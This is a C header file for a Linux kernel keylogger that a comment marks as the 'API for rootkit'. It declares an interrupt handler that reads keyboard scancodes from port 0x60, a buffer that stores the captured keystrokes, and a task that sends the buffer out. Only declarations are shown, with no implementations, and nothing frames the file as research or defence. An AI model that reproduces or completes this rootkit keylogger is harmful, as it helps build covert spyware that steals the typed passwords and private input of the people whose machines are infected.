#include "kfifo.h"
#include <linux/interrupt.h>

#ifndef KEYLOGGER_H
#define KEYLOGGER_H

#define DATA_PORT 0x60

typedef unsigned char Byte;

typedef struct irq_data {
	unsigned char scancode;
} irq_data;

typedef struct keylogger_buffer {
	unsigned char buffer[KFIFO_SIZE_MAX];
	int size;
} keylogger_buffer;

// internals
keylogger_buffer *_keylogger_buffer_read(void);
void _keylogger_buffer_write(unsigned char *scancode);
irqreturn_t _irq_handler(int irq, void *dev_id);
void _keylogger_buffer_send_task(struct work_struct *work);

// API for rootkit
void keylogger_init(void);
void keylogger_exit(void);
void keylogger_buffer_send(void);

#endif